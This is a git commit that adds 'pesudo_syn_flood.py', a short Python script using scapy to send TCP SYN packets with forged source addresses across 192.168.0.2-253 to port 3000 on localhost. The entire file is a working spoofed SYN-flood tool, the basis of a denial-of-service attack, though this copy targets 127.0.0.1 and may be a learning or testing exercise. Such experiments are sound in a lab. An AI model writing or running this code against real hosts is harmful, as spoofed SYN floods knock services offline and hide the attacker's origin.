7e7bf6fc8791bffe87eddc4e9e8f3eeb30e6692e
Kenta Togashi <4276550+kentatogashi@users.noreply.github.com>
2018-12-29 21:38:08 +0900

    Add pesudo_syn_flood.py

---
+++ pesudo_syn_flood.py
@@ -0,0 +1,18 @@
+import sys
+from scapy.all import *
+
+def main():
+    src_net = '192.168.0.'
+    dst_ip = '127.0.0.1'
+    dst_port = 3000
+    sleep = 1
+    for src_host in range(2, 254):
+        for src_port in range(1024, 1030):
+            print(f'sending from {src_net}{src_host}:{src_port} to {dst_ip}:{dst_port}')
+            src_ip = src_net+str(src_host)
+            network_layer = IP(src=src_ip, dst=dst_ip)
+            transport_layer = TCP(sport=src_port, dport=dst_port, flags='S')
+            send(network_layer/transport_layer)
+
+if __name__ == '__main__':
+    main()
